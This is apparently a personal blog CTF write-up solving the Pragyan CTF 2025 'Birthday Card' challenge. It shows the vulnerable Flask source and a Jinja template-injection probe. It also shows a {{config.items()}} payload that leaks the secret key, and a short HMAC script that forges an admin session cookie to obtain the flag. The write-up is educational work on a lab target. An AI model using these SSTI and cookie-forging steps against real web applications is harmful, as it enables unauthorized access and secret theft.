---
title: Birthday Card
date: 2025-02-11 01:29:12 +0800
categories: [Hacking, CTF]
tags: [web, ssti]     # TAG names should always be lowercase
description: Using SSTI to solve Pragyan CTF 2025 "Birthday Card" challenge
---

## Introduction

My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.

## First glance

When I went to the target site, `https://birthday.ctf.prgy.in/`, I saw this:

![firstglance](https://github.com/user-attachments/assets/acf0cb40-4c45-4eb8-a82d-82f26f7b0638){: width="400" height="300" }


My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source `appy.py`

## App.py

<details markdown="1" id="appjs">
<summary>App.py</summary>

```python

from flask import Flask, request, jsonify, abort, render_template_string, session, redirect
import builtins as _b
import sys
import os


app = Flask(__name__)
app.secret_key = os.getenv("APP_SECRET_KEY", "default_app_secret")
env = app.jinja_env


KEY = os.getenv("APP_SECRET_KEY", "default_secret_key")


class validator:
    def security():
        return _b
    def security1(a, b, c, d):
        if 'validator' in a or 'validator' in b or 'validator' in c or 'validator' in d:
            return False
        elif 'os' in a or 'os' in b or 'os' in c or 'os' in d:
            return False
        else:
            return True
    
    def security2(a, b, c, d):
        if len(a) <= 50 and len(b) <= 50 and len(c) <= 50 and len(d) <= 50:
            return True
        else :
            return False
        


@app.route("/", methods=["GET", "POST"])
def personalized_card():
    if request.method == "GET":
        return """
        <link rel="stylesheet" href="static/style.css">
        <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,600&display=swap" rel="stylesheet">
        <div class="container">
            <div class="card-generator">
                <h1>Personalized Card Generator</h1>
                <form action="/" method="POST">
                    <label for="sender">Sender's Name:</label>
                    <input type="text" id="sender" name="sender" placeholder="Your name" required maxlength="50">
                    <label for="recipient">Recipient's Name:</label>
                    <input type="text" id="recipient" name="recipient" placeholder="Recipient's name" required maxlength="50">
                    <label for="message">Message:</label>
                    <input type="text" id="message" name="message" placeholder="Your message" required maxlength="50">
                    <label for="message_final">Final Message:</label>
                    <input type="text" id="message_final" name="message_final" placeholder="Final words" required maxlength="50">
                    <button type="submit">Generate Card</button>
                </form>
            </div>
        </div>
        """

    elif request.method == "POST":
        try:
            recipient = request.form.get("recipient", "")
            sender = request.form.get("sender", "")
            message = request.form.get("message", "")
            final_message = request.form.get("message_final", "")
            if validator.security1(recipient, sender, message, final_message) and validator.security2(recipient, sender, message, final_message):
                template = f"""
                    <link rel="stylesheet" href="static/style.css">
                    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,600&display=swap" rel="stylesheet">
                    <div class="container">
                        <div class="card-preview">
                            <h1>Your Personalized Card</h1>
                            <div class="card">
                                <h2>From: {sender}</h2>
                                <h2>To: {recipient}</h2>
                                <p>{message}</p>
                                <h1>{final_message}</h1>
                            </div>
                            <a class="new-card-link" href="/">Create Another Card</a>
                        </div>
                    </div>
                """
            else :
                template="either the recipient or sender or message input is more than 50 letters"

            app.jinja_env = env    
            app.jinja_env.globals.update({
                'validator': validator()
            })
            return render_template_string(template)

        except Exception as e:
            return f"""
            <link rel="stylesheet" href="static/style.css">
            <div>
                <h1>Error: {str(e)}</h1>
                <br>
                <p>Please try again. <a href="/">Back to Card Generator</a></p>
            </div>
            """, 400
        



@app.route("/debug/test", methods=["POST"])
def test_debug():
    user = session.get("user")
    host = request.headers.get("Host", "")
    if host != "localhost:3030":
        return "Access restricted to localhost:3030, this endpoint is only development purposes", 403
    if not user:
        return "You must be logged in to test debugging.", 403
    try:
        raise ValueError(f"Debugging error: SECRET_KEY={KEY}")
    except Exception as e:
        return "Debugging error occurred.", 500



@app.route("/admin/report")
def admin_report():
    auth_cookie = request.cookies.get("session")
    if not auth_cookie:
        abort(403, "Unauthorized access.")
    try:
        token, signature = auth_cookie.rsplit(".", 1)
        from app.sign import initFn
        signer = initFn(KEY)
        sign_token_function = signer.get_signer()
        valid_signature = sign_token_function(token)

        if valid_signature != signature:
            abort(403, f"Invalid token.")

        if token == "admin":
            return "Flag: p_ctf{redacted}"
        else:
            return "Access denied: admin only."
    except Exception as e:
        abort(403, f"Invalid token format: {e}")

@app.after_request
def clear_imports(response):
    if 'app.sign' in sys.modules:
        del sys.modules['app.sign']
    if 'app.sign' in globals():
        del globals()['app.sign']
    return response
```
</details>

### Used of Jinja
I quickly glanced through the code and saw `Jinja` 

```python
            app.jinja_env = env    
            app.jinja_env.globals.update({
                'validator': validator()
            })
            return render_template_string(template)
```

This immediately made me think of Server-side Template Injection (SSTI), so I quickly returned to the target site and tested `{{ '{{' }} 7*7 }}` and indeed SSTI, is possible



![49](https://github.com/user-attachments/assets/2ce9c844-3e72-4827-a1ef-26ccee03c650){: width="600" height="300" }


### Sanitization

```python
class validator:
    def security():
        return _b
    def security1(a, b, c, d):
        if 'validator' in a or 'validator' in b or 'validator' in c or 'validator' in d:
            return False
        elif 'os' in a or 'os' in b or 'os' in c or 'os' in d:
            return False
        else:
            return True
    
    def security2(a, b, c, d):
        if len(a) <= 50 and len(b) <= 50 and len(c) <= 50 and len(d) <= 50:
            return True
        else :
            return False
```

This ensures that the input doesn't contain the string `validator` or `os`, and that it has a maximum length of 50 characters.

To solve this challenge, we don't need to bypass these checks, but they are needed in the harder version of the challenge(Deathday Card). 

For that I highly recommend reading this: [Nullbrunk Write-up for the Deathday Card Challenge](https://nullbrunk.github.io/posts/pragyan-deathdaycard/).

Going back to the challenge...


### /admin/report endpoint

```python
@app.route("/admin/report")
def admin_report():

    # Checks if the `Cookie` header contains a cookie-name called `session`
    # If not it returns a 403
    auth_cookie = request.cookies.get("session")
    if not auth_cookie:
        abort(403, "Unauthorized access.")



    try:
        # This means that the cookie-value would look like --> token.signature
        token, signature = auth_cookie.rsplit(".", 1)

        # This indicates that there is a file called sign.py
        from app.sign import initFn

        # KEY = os.getenv("APP_SECRET_KEY", "default_secret_key")
        signer = initFn(KEY)

        #Creating a valid signature
        sign_token_function = signer.get_signer()
        valid_signature = sign_token_function(token)

        # Checks if the signature from the cookie-value is not the same as the created valid_signature
        # If False then it continues but if True then it returns a 403
        if valid_signature != signature:
            abort(403, f"Invalid token.")

        
        # If the first part of the cookie-value is equal to "admin" then it gives us the flag.
        # If not then it returns a 403
        if token == "admin": # We now know that the token is "admin"
            return "Flag: p_ctf{redacted}"
        else:
            return "Access denied: admin only."
    except Exception as e:
        abort(403, f"Invalid token format: {e}")
```

***Please read the comments for my explanation of what the code is doing***

With this, to get the flag we just need to generate a valid session:

* `Token` = `"admin"`
* `Key` = `unknown`
* `Algorithm` used to generate a valid signature = `unknown`

Since we have an SSTI it was pretty easy to leak the value of `KEY`

By using this payload: `{{ '{{' }}config.items()}}` I was able to leak it :P

![leakedSecretKey](https://github.com/user-attachments/assets/cdae04ed-b59b-4bda-8761-6be842682241){: width="600" height="300" }

So we now have this:

* `Token` = `"admin"`
* `Key` = `"dsbfeif3uwf6bes878hgi"`
* `Algorithm` used to generate a valid signature = `unknown`


For the last part I actually just guessed it xD I figured I'd try to use HMAC-SHA-256 since it's a common choice to generate a signature.

## gen.py

With all of that, I created this script.

```python
import hmac
import hashlib

# Secret key
KEY = b"dsbfeif3uwf6bes878hgi"

# Token
token = "admin"

signature = hmac.new(KEY, token.encode(), hashlib.sha256).hexdigest()
auth_cookie = f"{token}.{signature}"

print(auth_cookie)
```

Running `gen.py` returns -> `admin.dc92ab47061ce7a0922596817589737de0b8dde08e7fbe6c7772ad5f87ea9f0b`

## Flag

To check if that is a valid `cookie-value`, I used it and made a request to `/admin/report` and...


![flag](https://github.com/user-attachments/assets/9d34926c-ae75-4659-8da5-9e30f86fca80)

Finally, we got the `Flag: p_ctf{S3rVer_STI_G0es_hArd}`


That's all for this write-up! Thanks for reading, and have a nice day :D

-***Datsuraku147***